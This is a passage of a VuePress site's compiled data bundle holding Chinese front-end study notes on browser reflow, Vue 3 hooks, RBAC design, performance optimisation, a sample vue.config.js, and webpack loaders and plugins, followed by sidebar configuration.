style 属性的值，因为通过设置style属性改变结点样式的话，每一次设置都会触发一次reflow\n * 查询某些属性或调用某些计算方法：offsetwidth、offsetheight等\n\n# 优化重排\n\n * 集中修改样式，或直接使用 class\n * dom 操作前先使用 display: none,absolute 或 fixed 脱离文档流\n * 使用 bfc ，不影响外部的元素\n * 对于频繁触发的操作（resize scroll 等）使用节流和防抖\n * 使用 createdocumentfragment 进行批量 dom 操作\n * 优化动画，如使用 requestanimationframe 或者 css3（可启用 gpu 加速）\n\n//强制刷新 触发两次重排\ndiv.style.left = div.offsetleft + 1 + 'px';\ndiv.style.top = div.offsettop + 1 + 'px';\n//优化\n//缓存布局信息 相当于读写分离\nvar curleft = div.offsetleft;\nvar curtop = div.offsettop;\ndiv.style.left = curleft + 1 + 'px';\ndiv.style.top = curtop + 1 + 'px';\n\n\n\n# 触发 css bfc 的条件\n\nbfc - block formatting context 块格式化上下文\n\n * 根节点 html\n * 设置 float left right\n * 设置 overflow auto scroll hidden\n * 设置 display inline-block table table-cell flex grid\n * 设置 position absolute fixed",charsets:{cjk:!0}},{title:"vue3相比于vue2",frontmatter:{"title:'vue3相比于vue2'":null},regularPath:"/webstudy/Vue3/vue3%E7%9B%B8%E6%AF%94%E4%BA%8Evue2.html",relativePath:"webstudy/Vue3/vue3相比于vue2.md",key:"v-22109f78",path:"/webstudy/Vue3/vue3%E7%9B%B8%E6%AF%94%E4%BA%8Evue2.html",headers:[{level:2,title:"对比",slug:"对比",normalizedTitle:"对比",charIndex:18},{level:3,title:"1、vue3-composition API和vue2-options Api",slug:"_1、vue3-composition-api和vue2-options-api",normalizedTitle:"1、vue3-composition api和vue2-options api",charIndex:25},{level:3,title:"2、生命周期",slug:"_2、生命周期",normalizedTitle:"2、生命周期",charIndex:1087},{level:3,title:"3、vue3对全局API的优化",slug:"_3、vue3对全局api的优化",normalizedTitle:"3、vue3对全局api的优化",charIndex:1098},{level:3,title:"4、ts的支持",slug:"_4、ts的支持",normalizedTitle:"4、ts的支持",charIndex:1264},{level:3,title:"5、Proxy",slug:"_5、proxy",normalizedTitle:"5、proxy",charIndex:1276},{level:3,title:"6、Fragment, Teleport, Suspense",slug:"_6、fragment-teleport-suspense",normalizedTitle:"6、fragment, teleport, suspense",charIndex:1288}],headersStr:"对比 1、vue3-composition API和vue2-options Api 2、生命周期 3、vue3对全局API的优化 4、ts的支持 5、Proxy 6、Fragment, Teleport, Suspense",content:"# vue3相比于vue2\n\n\n# 对比\n\n\n# 1、vue3-composition API和vue2-options Api\n\n# hooks\n\n在此想到和vue2 mixin有关的缺陷就不解释，hooks的使用很好的规避使用mixin的问题\n\n * 使用Vue3的组合API封装的可复用的功能函数\n\n * 知道复用功能代码的引用来源, 不会出现像mixin这种隐式引用的弊端\n\n# 实现一个获取鼠标位置的hooks\n\nimport { ref, onMounted, onUnmounted, Ref } from 'vue'\ninterface Position {\n  x: Ref<number>,\n  y: Ref<number>\n}\nfunction getMousePosition(): Position {\n  const x = ref(0)\n  const y = ref(0)\n\n  const updateMouse = (e: MouseEvent) => {\n    x.value = e.pageX\n    y.value = e.pageY\n  }\n\n  onMounted(() => {\n    document.addEventListener('click', updateMouse)\n  })\n\n  onUnmounted(() => {\n    document.removeEventListener('click', updateMouse)\n  })\n\n  return { x, y }\n}\nexport default getMousePosition\n\n\n组件中使用\n\n<template>\n  <div>\n    <p>X: {{ x }}</p>\n    <p>Y: {{ y }}</p>\n  </div>\n</template>\n<script lang=\"ts\">\nimport { defineComponent} from 'vue'\n// 引入hooks\nimport getMousePosition from '../../hooks/MousePosition'\nexport default defineComponent({\n  setup () {\n    // 使用hooks功能\n    const { x, y } = useMousePosition()\n    return {\n      x,\n      y\n    }\n  }\n})\n<\/script>\n\n\n\n# 2、生命周期\n\n\n# 3、vue3对全局API的优化\n\n在 Vue3 中，全局和内部 API 都经过了重构，并考虑到了 tree-shaking 的支持。因此，全局 API现在只能作为 ES 模块构建的命名导出进行访问\n\nimport { nextTick } from 'vue'\nnextTick(() => {\n  //操作Dom\n})\n\n\n\n# 4、ts的支持\n\n\n# 5、Proxy\n\n\n# 6、Fragment, Teleport, Suspense\n\n * Fragment（碎片）告别一个template标签包起整个组件",normalizedContent:"# vue3相比于vue2\n\n\n# 对比\n\n\n# 1、vue3-composition api和vue2-options api\n\n# hooks\n\n在此想到和vue2 mixin有关的缺陷就不解释，hooks的使用很好的规避使用mixin的问题\n\n * 使用vue3的组合api封装的可复用的功能函数\n\n * 知道复用功能代码的引用来源, 不会出现像mixin这种隐式引用的弊端\n\n# 实现一个获取鼠标位置的hooks\n\nimport { ref, onmounted, onunmounted, ref } from 'vue'\ninterface position {\n  x: ref<number>,\n  y: ref<number>\n}\nfunction getmouseposition(): position {\n  const x = ref(0)\n  const y = ref(0)\n\n  const updatemouse = (e: mouseevent) => {\n    x.value = e.pagex\n    y.value = e.pagey\n  }\n\n  onmounted(() => {\n    document.addeventlistener('click', updatemouse)\n  })\n\n  onunmounted(() => {\n    document.removeeventlistener('click', updatemouse)\n  })\n\n  return { x, y }\n}\nexport default getmouseposition\n\n\n组件中使用\n\n<template>\n  <div>\n    <p>x: {{ x }}</p>\n    <p>y: {{ y }}</p>\n  </div>\n</template>\n<script lang=\"ts\">\nimport { definecomponent} from 'vue'\n// 引入hooks\nimport getmouseposition from '../../hooks/mouseposition'\nexport default definecomponent({\n  setup () {\n    // 使用hooks功能\n    const { x, y } = usemouseposition()\n    return {\n      x,\n      y\n    }\n  }\n})\n<\/script>\n\n\n\n# 2、生命周期\n\n\n# 3、vue3对全局api的优化\n\n在 vue3 中，全局和内部 api 都经过了重构，并考虑到了 tree-shaking 的支持。因此，全局 api现在只能作为 es 模块构建的命名导出进行访问\n\nimport { nexttick } from 'vue'\nnexttick(() => {\n  //操作dom\n})\n\n\n\n# 4、ts的支持\n\n\n# 5、proxy\n\n\n# 6、fragment, teleport, suspense\n\n * fragment（碎片）告别一个template标签包起整个组件",charsets:{cjk:!0}},{title:"权限设计",frontmatter:{title:"权限设计"},regularPath:"/webstudy/%E9%A1%B9%E7%9B%AE/%E6%9D%83%E9%99%90%E8%AE%BE%E8%AE%A1.html",relativePath:"webstudy/项目/权限设计.md",key:"v-5dce9a2e",path:"/webstudy/%E9%A1%B9%E7%9B%AE/%E6%9D%83%E9%99%90%E8%AE%BE%E8%AE%A1.html",headers:[{level:2,title:"RBAC模型",slug:"rbac模型",normalizedTitle:"rbac模型",charIndex:34}],headersStr:"RBAC模型",content:"# 权限设计\n\n如何设计一个基础的 用户-角色-权限 模型\n\n\n# RBAC模型\n\nRole-based access control 基于角色的访问控制。它可以满足我们绝大部分管理系统的管理权限控制。\n\n * 三个模型\n   * 用户\n   * 角色\n   * 权限\n * 两个关系（以角色为“轴”）\n   * 角色 - 用户\n   * 角色 - 权限\n\n角色:产品经理，开发负责人，开发人员，测试负责人，版本经理，测试人员，运维负责人... 权限:页面的权限，操作按钮的权限",normalizedContent:"# 权限设计\n\n如何设计一个基础的 用户-角色-权限 模型\n\n\n# rbac模型\n\nrole-based access control 基于角色的访问控制。它可以满足我们绝大部分管理系统的管理权限控制。\n\n * 三个模型\n   * 用户\n   * 角色\n   * 权限\n * 两个关系（以角色为“轴”）\n   * 角色 - 用户\n   * 角色 - 权限\n\n角色:产品经理，开发负责人，开发人员，测试负责人，版本经理，测试人员，运维负责人... 权限:页面的权限，操作按钮的权限",charsets:{cjk:!0}},{title:"性能优化",frontmatter:{title:"性能优化"},regularPath:"/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html",relativePath:"webstudy/运行环境/性能优化.md",key:"v-f3eb5e7c",path:"/webstudy/%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96.html",headers:[{level:2,title:"前端通用的优化策略",slug:"前端通用的优化策略",normalizedTitle:"前端通用的优化策略",charIndex:11},{level:2,title:"性能优化的原则",slug:"性能优化的原则",normalizedTitle:"性能优化的原则",charIndex:49},{level:2,title:"思路",slug:"思路",normalizedTitle:"思路",charIndex:106},{level:3,title:"1、让加载更快",slug:"_1、让加载更快",normalizedTitle:"1、让加载更快",charIndex:113},{level:3,title:"2、让渲染更快",slug:"_2、让渲染更快",normalizedTitle:"2、让渲染更快",charIndex:246},{level:2,title:"体验优化",slug:"体验优化",normalizedTitle:"体验优化",charIndex:371}],headersStr:"前端通用的优化策略 性能优化的原则 思路 1、让加载更快 2、让渲染更快 体验优化",content:"# 性能优化\n\n\n# 前端通用的优化策略\n\n压缩资源，使用 CDN ，http 缓存等。\n\n\n# 性能优化的原则\n\n * 多使用内存、缓存等方式（用空间换时间）\n * 减少cpu计算量，减少网络加载耗时\n\n\n# 思路\n\n\n# 1、让加载更快\n\n * 减少资源体积:js，css，图片通过webpack打包...服务器端的gzip压缩，浏览器解压解析...\n\n * 减少访问次数:合并代码(webpack打包成bundle文件)、SSR服务端渲染、缓存\n\n * 使用更快的网路:CDN\n\n\n# 2、让渲染更快\n\n * css放在head中,js放在body最下面\n * 尽早执行js代码，使用DOMContentLoaded触发\n * 懒加载\n * 对DOM查询进行缓存，频繁的DOM操作合并到一起插入DOM结构(也就是避免网页重排)\n\n\n# 体验优化\n\n * 骨架屏",normalizedContent:"# 性能优化\n\n\n# 前端通用的优化策略\n\n压缩资源，使用 cdn ，http 缓存等。\n\n\n# 性能优化的原则\n\n * 多使用内存、缓存等方式（用空间换时间）\n * 减少cpu计算量，减少网络加载耗时\n\n\n# 思路\n\n\n# 1、让加载更快\n\n * 减少资源体积:js，css，图片通过webpack打包...服务器端的gzip压缩，浏览器解压解析...\n\n * 减少访问次数:合并代码(webpack打包成bundle文件)、ssr服务端渲染、缓存\n\n * 使用更快的网路:cdn\n\n\n# 2、让渲染更快\n\n * css放在head中,js放在body最下面\n * 尽早执行js代码，使用domcontentloaded触发\n * 懒加载\n * 对dom查询进行缓存，频繁的dom操作合并到一起插入dom结构(也就是避免网页重排)\n\n\n# 体验优化\n\n * 骨架屏",charsets:{cjk:!0}},{title:"vue.config.js配置案例",frontmatter:{title:"vue.config.js配置案例"},regularPath:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/vue.config.js%E9%85%8D%E7%BD%AE%E6%A1%88%E4%BE%8B.html",relativePath:"webstudy/工程化/vue.config.js配置案例.md",key:"v-9281c836",path:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/vue.config.js%E9%85%8D%E7%BD%AE%E6%A1%88%E4%BE%8B.html",headers:[{level:2,title:"vue.config.js配置案例",slug:"vue-config-js配置案例",normalizedTitle:"vue.config.js配置案例",charIndex:2}],headersStr:"vue.config.js配置案例",content:"# vue.config.js配置案例\n\n// 打包多入口文件基本配置\nlet developmentPath = './';//开发环境-npm run serve时引用文件路径\nlet productionPath = './';//生产环境-npm run build打包后引用文件路径\n\nconst UglifyJsPlugin = require('uglifyjs-webpack-plugin')//生产环境取消打印\nconst CompressionWebpackPlugin = require('compression-webpack-plugin')//gzip压缩\n\nconst productionGzipExtensions = ['js', 'css']\nconst Version = 'V6.1'\nconst Timestamp = new Date().getTime()\nfunction getPagesInfo() {\n    let pages = {}\n    const glob = require('glob') // 引入glob模块,用于扫描全部src/pages/**/main.js（返回的是一个数组）\n    glob.sync('src/pages/**/main.js').forEach((entry, i) => {\n        let name = entry.slice(10, -8)\n        pages[name] = {\n            entry: entry,\n            template: 'public.index.html',\n            filename: name + '.html',\n            title: '',\n            chunks: [\"chunk-vendors\", \"chunk-common\", name]\n        }\n    })\n    return pages\n}\n// 打包相关\nmodule.exports = {\n    pages: getPagesInfo(),//多页面应用配置\n    publicPath: process.env.NODE_ENV === 'production' ? productionPath : developmentPath, // 基本路径-引用文件的路 __dirname + '/server/dist', //build之后静态文件输出路径\n    assetsDir: 'static',//静态资源大包位置\n    outputDir: __dirname + '/server/dist', //build之后静态文件输出路径\n    lintOnSave: process.env.NODE_ENV !== 'production',// 打包的时候eslint-loader检查 \n    productionSourceMap: false,//source map 检查\n    // 启动服务器\n    devServer: {\n        index: '/login.html',   //默认打开文件\n        open: true,             //自动打开浏览器\n        host: 'localhost',      //默认打开域名\n        port: 8080,             //默认打开端口号\n        https: false,           //开启关闭https请求\n        hotOnly: false,         //热更\n        // 反向代理\n        proxy: {\n            // 配置跨域\n            '/api': {\n                target: 'http://dev.aabb.cn:8082/', //代理地址，这里设置的地址会代替axios中设置的baseURL\n                ws: true,   //// proxy websockets\n                changeOrigin: true,// 如果接口跨域，需要进行这个参数配置\n                pathRewrite: {                //pathRewrite方法重写url\n                    '^/api': '/',\n                },\n            },\n            \"/api2\": {\n                    target: \"http://172.12.12.12:2018\",\n                    changeOrigin: true,\n                    //ws: true,//websocket支持\n                    secure: false,\n                    pathRewrite: {\n                        \"^/api2\": \"/\"\n                    }\n                }\n        }\n    }\n    // webpack配置  链式\n    chainWebpack: (config) => {\n        // 1、取消预加载增加加载速度\n        config.plugins.delete('preload')\n        config.plugins.delete('prefetch')\n\n        // 2、vue中使用SVG图标，并且想批量导入，然后需要使用的时候直接添加就可以\n        config.module\n            .rule('svg')\n            .exclude.add(resolve('src/assets/icons'))\n            .end()\n        config.module\n            .rule('icons')\n            .test(/\\.svg$/)\n            .include.add(resolve('src/assets/icons'))\n            .end()\n            .use('svg-sprite-loader')\n            .loader('svg-sprite-loader')\n            .options({\n                symbolId: 'icon-[name]',\n            })\n            .end()\n\n        // 3、图片处理\n        const imagesRule = config.module.rule('images')\n        imagesRule.uses.clear() //清除原本的images loader配置\n        imagesRule\n            .test(/\\.(jpg|gif|png|svg)$/)\n            .exclude.add(path.join(__dirname, '../node_modules')) //不对node_modules里的图片转base64\n            .end()\n            .use('url-loader')\n            .loader('url-loader')\n            .options({ name: 'img/[name].[hash:8].[ext]', limit: 6000000 })\n\n        config.optimization.splitChunks({\n            cacheGroups: {\n\n                vendors: {\n                    name: 'chunk-vendors',\n                    minChunks: pageNum,\n                    test: /node_modules/,\n                    priority: -10,\n                    chunks: 'initial',\n                },\n\n                elementUI: {\n                    name: 'chunk-elementUI', // split elementUI into a single package\n                    priority: 20, // the weight needs to be larger than libs and app or it will be packaged into libs or app\n                    test: /[\\\\/]node_modules[\\\\/]_?element-ui(.*)/, // in order to adapt to cnpm\n                },\n\n                commons: {\n                    name: 'chunk-commons',\n                    test: resolve('src/components'), // can customize your rules\n                    minChunks: 3, //  minimum common number\n                    priority: 5,\n                    reuseExistingChunk: true,\n                },\n            },\n        })\n    },\n    // webpack配置\n    configureWebpack: (config) => {\n          // 为生产环境修改配置\n        if (process.env.NODE_ENV === 'production') {\n      \n            config.plugins.push(\n                  // 1、取消打印\n                new UglifyJsPlugin({\n                    uglifyOptions: {\n                        compress: {\n                            drop_debugger: true,//生产环境自动删除debugger\n                            drop_console: true, //生产环境自动删除console\n                        },\n                        warnings: false,\n                    },\n                    sourceMap: false,   //关掉sourcemap 会生成对于调试的完整的.map文件，但同时也会减慢打包速度\n                    parallel: true, //使用多进程并行运行来提高构建速度。默认并发运行数：os.cpus().length - 1。\n                }),\n\n                // 2、gzip压缩\n                new CompressionWebpackPlugin({\n                    filename: '[path].gz[query]',\n                    algorithm: 'gzip',\n                    test: new RegExp('\\\\.(' + productionGzipExtensions.join('|') + ')$'),\n                    threshold: 10240,\n                    minRatio: 0.8,\n                })\n            )\n        }\n\n        // 在这里配置后，减少了压缩的包内容，需要在public/index.html通过cdn方式再引入,注意对应的版本\n        config.externals = { \n            vue: 'Vue',\n            'vue-router': 'VueRouter',\n            vuex: 'Vuex',\n            axios: 'axios',\n            jquery: '$',\n            moment: 'moment',\n            'mint-ui': 'MINT'\n        },\n\n\n         // 别名配置\n        Object.assign(config, {\n            // 开发生产共同配置\n            resolve: {\n                alias: {\n                '@': path.resolve(__dirname, './src'),\n                '@c': path.resolve(__dirname, './src/components'),\n                '@p': path.resolve(__dirname, './src/pages')\n                }\n            }\n        }),\n\n        config.output.filename = `[name].${Version}.${Timestamp}.js`  //打包生成的文件\n        config.output.chunkFilename = `[name].${Version}.${Timestamp}.js`\n    },\n    // css相关\n    css: {\n        loaderOptions: {\n            // 配置全局sass\n            scss: {\n                additionalData: `@import \"@/assets/css/reset.scss\";@import \"@/assets/css/globle.scss\";`  //注意配置的键名\n            },\n            // lib-flexible\n            postcss: {\n                plugins: [\n                    //remUnit这个配置项的数值是多少呢？？？ 通常我们是根据设计图来定这个值，原因很简单，便于开发。\n                    //假如设计图给的宽度是750，我们通常就会把remUnit设置为75，这样我们写样式时，可以直接按照设计图标注的宽高来1:1还原开发。\n                    require('postcss-px2rem')({\n                        remUnit: 37.5\n                    })\n                ]\n            }\n        }\n    },\n    parallel: require('os').cpus().length > 1, // 是否为 Babel 或 TypeScript 使用 thread-loader。该选项在系统的 CPU 有多于一个内核时自动启用，仅作用于生产构建。\n    pwa: {}, // PWA 插件相关配置 \n    pluginOptions: {},  // 第三方插件配置\n};\n",normalizedContent:"# vue.config.js配置案例\n\n// 打包多入口文件基本配置\nlet developmentpath = './';//开发环境-npm run serve时引用文件路径\nlet productionpath = './';//生产环境-npm run build打包后引用文件路径\n\nconst uglifyjsplugin = require('uglifyjs-webpack-plugin')//生产环境取消打印\nconst compressionwebpackplugin = require('compression-webpack-plugin')//gzip压缩\n\nconst productiongzipextensions = ['js', 'css']\nconst version = 'v6.1'\nconst timestamp = new date().gettime()\nfunction getpagesinfo() {\n    let pages = {}\n    const glob = require('glob') // 引入glob模块,用于扫描全部src/pages/**/main.js（返回的是一个数组）\n    glob.sync('src/pages/**/main.js').foreach((entry, i) => {\n        let name = entry.slice(10, -8)\n        pages[name] = {\n            entry: entry,\n            template: 'public.index.html',\n            filename: name + '.html',\n            title: '',\n            chunks: [\"chunk-vendors\", \"chunk-common\", name]\n        }\n    })\n    return pages\n}\n// 打包相关\nmodule.exports = {\n    pages: getpagesinfo(),//多页面应用配置\n    publicpath: process.env.node_env === 'production' ? productionpath : developmentpath, // 基本路径-引用文件的路 __dirname + '/server/dist', //build之后静态文件输出路径\n    assetsdir: 'static',//静态资源大包位置\n    outputdir: __dirname + '/server/dist', //build之后静态文件输出路径\n    lintonsave: process.env.node_env !== 'production',// 打包的时候eslint-loader检查 \n    productionsourcemap: false,//source map 检查\n    // 启动服务器\n    devserver: {\n        index: '/login.html',   //默认打开文件\n        open: true,             //自动打开浏览器\n        host: 'localhost',      //默认打开域名\n        port: 8080,             //默认打开端口号\n        https: false,           //开启关闭https请求\n        hotonly: false,         //热更\n        // 反向代理\n        proxy: {\n            // 配置跨域\n            '/api': {\n                target: 'http://dev.aabb.cn:8082/', //代理地址，这里设置的地址会代替axios中设置的baseurl\n                ws: true,   //// proxy websockets\n                changeorigin: true,// 如果接口跨域，需要进行这个参数配置\n                pathrewrite: {                //pathrewrite方法重写url\n                    '^/api': '/',\n                },\n            },\n            \"/api2\": {\n                    target: \"http://172.12.12.12:2018\",\n                    changeorigin: true,\n                    //ws: true,//websocket支持\n                    secure: false,\n                    pathrewrite: {\n                        \"^/api2\": \"/\"\n                    }\n                }\n        }\n    }\n    // webpack配置  链式\n    chainwebpack: (config) => {\n        // 1、取消预加载增加加载速度\n        config.plugins.delete('preload')\n        config.plugins.delete('prefetch')\n\n        // 2、vue中使用svg图标，并且想批量导入，然后需要使用的时候直接添加就可以\n        config.module\n            .rule('svg')\n            .exclude.add(resolve('src/assets/icons'))\n            .end()\n        config.module\n            .rule('icons')\n            .test(/\\.svg$/)\n            .include.add(resolve('src/assets/icons'))\n            .end()\n            .use('svg-sprite-loader')\n            .loader('svg-sprite-loader')\n            .options({\n                symbolid: 'icon-[name]',\n            })\n            .end()\n\n        // 3、图片处理\n        const imagesrule = config.module.rule('images')\n        imagesrule.uses.clear() //清除原本的images loader配置\n        imagesrule\n            .test(/\\.(jpg|gif|png|svg)$/)\n            .exclude.add(path.join(__dirname, '../node_modules')) //不对node_modules里的图片转base64\n            .end()\n            .use('url-loader')\n            .loader('url-loader')\n            .options({ name: 'img/[name].[hash:8].[ext]', limit: 6000000 })\n\n        config.optimization.splitchunks({\n            cachegroups: {\n\n                vendors: {\n                    name: 'chunk-vendors',\n                    minchunks: pagenum,\n                    test: /node_modules/,\n                    priority: -10,\n                    chunks: 'initial',\n                },\n\n                elementui: {\n                    name: 'chunk-elementui', // split elementui into a single package\n                    priority: 20, // the weight needs to be larger than libs and app or it will be packaged into libs or app\n                    test: /[\\\\/]node_modules[\\\\/]_?element-ui(.*)/, // in order to adapt to cnpm\n                },\n\n                commons: {\n                    name: 'chunk-commons',\n                    test: resolve('src/components'), // can customize your rules\n                    minchunks: 3, //  minimum common number\n                    priority: 5,\n                    reuseexistingchunk: true,\n                },\n            },\n        })\n    },\n    // webpack配置\n    configurewebpack: (config) => {\n          // 为生产环境修改配置\n        if (process.env.node_env === 'production') {\n      \n            config.plugins.push(\n                  // 1、取消打印\n                new uglifyjsplugin({\n                    uglifyoptions: {\n                        compress: {\n                            drop_debugger: true,//生产环境自动删除debugger\n                            drop_console: true, //生产环境自动删除console\n                        },\n                        warnings: false,\n                    },\n                    sourcemap: false,   //关掉sourcemap 会生成对于调试的完整的.map文件，但同时也会减慢打包速度\n                    parallel: true, //使用多进程并行运行来提高构建速度。默认并发运行数：os.cpus().length - 1。\n                }),\n\n                // 2、gzip压缩\n                new compressionwebpackplugin({\n                    filename: '[path].gz[query]',\n                    algorithm: 'gzip',\n                    test: new regexp('\\\\.(' + productiongzipextensions.join('|') + ')$'),\n                    threshold: 10240,\n                    minratio: 0.8,\n                })\n            )\n        }\n\n        // 在这里配置后，减少了压缩的包内容，需要在public/index.html通过cdn方式再引入,注意对应的版本\n        config.externals = { \n            vue: 'vue',\n            'vue-router': 'vuerouter',\n            vuex: 'vuex',\n            axios: 'axios',\n            jquery: '$',\n            moment: 'moment',\n            'mint-ui': 'mint'\n        },\n\n\n         // 别名配置\n        object.assign(config, {\n            // 开发生产共同配置\n            resolve: {\n                alias: {\n                '@': path.resolve(__dirname, './src'),\n                '@c': path.resolve(__dirname, './src/components'),\n                '@p': path.resolve(__dirname, './src/pages')\n                }\n            }\n        }),\n\n        config.output.filename = `[name].${version}.${timestamp}.js`  //打包生成的文件\n        config.output.chunkfilename = `[name].${version}.${timestamp}.js`\n    },\n    // css相关\n    css: {\n        loaderoptions: {\n            // 配置全局sass\n            scss: {\n                additionaldata: `@import \"@/assets/css/reset.scss\";@import \"@/assets/css/globle.scss\";`  //注意配置的键名\n            },\n            // lib-flexible\n            postcss: {\n                plugins: [\n                    //remunit这个配置项的数值是多少呢？？？ 通常我们是根据设计图来定这个值，原因很简单，便于开发。\n                    //假如设计图给的宽度是750，我们通常就会把remunit设置为75，这样我们写样式时，可以直接按照设计图标注的宽高来1:1还原开发。\n                    require('postcss-px2rem')({\n                        remunit: 37.5\n                    })\n                ]\n            }\n        }\n    },\n    parallel: require('os').cpus().length > 1, // 是否为 babel 或 typescript 使用 thread-loader。该选项在系统的 cpu 有多于一个内核时自动启用，仅作用于生产构建。\n    pwa: {}, // pwa 插件相关配置 \n    pluginoptions: {},  // 第三方插件配置\n};\n",charsets:{cjk:!0}},{title:"loader和plugin",frontmatter:{title:"loader和plugin"},regularPath:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack-loader%E5%92%8Cplugin.html",relativePath:"webstudy/工程化/webpack-loader和plugin.md",key:"v-7e65d116",path:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack-loader%E5%92%8Cplugin.html",headers:[{level:3,title:"loader",slug:"loader",normalizedTitle:"loader",charIndex:2},{level:3,title:"plugin",slug:"plugin",normalizedTitle:"plugin",charIndex:273}],headersStr:"loader plugin",content:"# loader\n\n由于webpack 本身只能打包js文件，所以，针对css，图片等格式的文件没法打包，就需要引入第三方的模块进行打包。loader虽然是扩展了 webpack ，但是它只专注于转化文件（transform）这一个领域，完成压缩，打包，语言翻译。loader是运行在NodeJS中。\n\n * css-loader和style-loader模块是为了打包css的\n * babel-loader和babel-core模块时为了把ES6的代码转成ES5\n * url-loader和file-loader是把图片进行打包的\n\n\n# plugin\n\nplugin也是为了扩展webpack的功能，但是 plugin 是作用于webpack本身上的。而且plugin不仅只局限在打包，资源的加载上，它的功能要更加丰富。从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle\n\n * FileManagerPlugin配置打包后可自动压缩打包文件\n\nplugins:[\n  new FileManagerPlugin({\n    events:{\n      onEnd:{\n        delete:['./dist.zip'], //删除上次一打包的压缩文件\n        archieve:[\n          {\n            source:'./dist',\n            destination:'./dist.zip' //压缩\n          }\n        ]\n      }\n    }\n  })\n]\n\n\n\n * HtmlWebpackPlugin",normalizedContent:"# loader\n\n由于webpack 本身只能打包js文件，所以，针对css，图片等格式的文件没法打包，就需要引入第三方的模块进行打包。loader虽然是扩展了 webpack ，但是它只专注于转化文件（transform）这一个领域，完成压缩，打包，语言翻译。loader是运行在nodejs中。\n\n * css-loader和style-loader模块是为了打包css的\n * babel-loader和babel-core模块时为了把es6的代码转成es5\n * url-loader和file-loader是把图片进行打包的\n\n\n# plugin\n\nplugin也是为了扩展webpack的功能，但是 plugin 是作用于webpack本身上的。而且plugin不仅只局限在打包，资源的加载上，它的功能要更加丰富。从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件commonchunkplugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle\n\n * filemanagerplugin配置打包后可自动压缩打包文件\n\nplugins:[\n  new filemanagerplugin({\n    events:{\n      onend:{\n        delete:['./dist.zip'], //删除上次一打包的压缩文件\n        archieve:[\n          {\n            source:'./dist',\n            destination:'./dist.zip' //压缩\n          }\n        ]\n      }\n    }\n  })\n]\n\n\n\n * htmlwebpackplugin",charsets:{cjk:!0}},{title:"前端工程化",frontmatter:{title:"前端工程化"},regularPath:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96.html",relativePath:"webstudy/工程化/前端工程化.md",key:"v-2725f445",path:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96.html",headers:[{level:2,title:"前端工程化",slug:"前端工程化",normalizedTitle:"前端工程化",charIndex:2}],headersStr:"前端工程化",content:"# 前端工程化",normalizedContent:"# 前端工程化",charsets:{cjk:!0}},{title:"微前端",frontmatter:{title:"微前端"},regularPath:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/%E5%BE%AE%E5%89%8D%E7%AB%AF.html",relativePath:"webstudy/工程化/微前端.md",key:"v-3e82da48",path:"/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/%E5%BE%AE%E5%89%8D%E7%AB%AF.html",headers:[{level:2,title:"微前端",slug:"微前端",normalizedTitle:"微前端",charIndex:2}],headersStr:"微前端",content:"# 微前端\n\n[我终于把微前端(qiankun)落地生产项目了-来自于掘金]https://juejin.cn/post/7114589692560932878",normalizedContent:"# 微前端\n\n[我终于把微前端(qiankun)落地生产项目了-来自于掘金]https://juejin.cn/post/7114589692560932878",charsets:{cjk:!0}}],themeConfig:{enableDarkMode:!0,repo:"https://github.com/HAOFUYANG/yang-blog",nav:[{text:"前端",link:"/webstudy/"},{text:"Javascript",link:"/javascript/"},{text:"数据结构",link:"/dataStructure/"},{text:"v1.0.2",link:"/"}],sidebar:{"/webstudy/":[{title:"Javascript",children:["/webstudy/Javascript/堆栈模型","/webstudy/Javascript/原型和原型链","/webstudy/Javascript/对象的创建与继承","/webstudy/Javascript/作用域和闭包","/webstudy/Javascript/内存泄漏和垃圾回收","/webstudy/Javascript/同步和异步","/webstudy/Javascript/JS严格模式"]},{title:"ES6及以上",children:["/webstudy/ES6及以上/箭头函数","/webstudy/ES6及以上/reduce","/webstudy/ES6及以上/for await of"]},{title:"HTML",children:["/webstudy/HTML/node和element","/webstudy/HTML/defer和async"]},{title:"CSS",children:["/webstudy/CSS/flex","/webstudy/CSS/文字超出省略","/webstudy/CSS/零碎的知识","/webstudy/CSS/Retina屏幕1px宽度"]},{title:"Vue2",children:["/webstudy/Vue2/特性","/webstudy/Vue2/MVVM","/webstudy/Vue2/Vue生命周期","/webstudy/Vue2/Vue响应式原理","/webstudy/Vue2/组件通讯","/webstudy/Vue2/computed和watch","/webstudy/Vue2/key","/webstudy/Vue2/虚拟dom和diff算法","/webstudy/Vue2/vue-router"]},{title:"Vue3",children:["/webstudy/Vue3/vue3相比于vue2","/webstudy/Vue3/Proxy"]},{title:"运行环境",children:["/webstudy/运行环境/网页的加载和渲染","/webstudy/运行环境/性能优化","/webstudy/运行环境/安全"]},{title:"Experience",children:["/webstudy/Experience/首屏优化","/webstudy/Experience/Vue优化"]},{title:"工程化",children:["/webstudy/工程化/前端工程化","/webstudy/工程化/webpack-loader和plugin","/webstudy/工程化/babel","/webstudy/工程化/vue.config.js配置案例","/webstudy/工程化/vite"]},{title:"HTTP",children:["/webstudy/HTTP/状态码","/webstudy/HTTP/ajax-fetch-axios","/webstudy/HTTP/Http协议1.0,1.1,2.0","/webstudy/HTTP/token和cookie","/webstudy/HTTP/TCP三次握手四次挥手","/webstudy/HT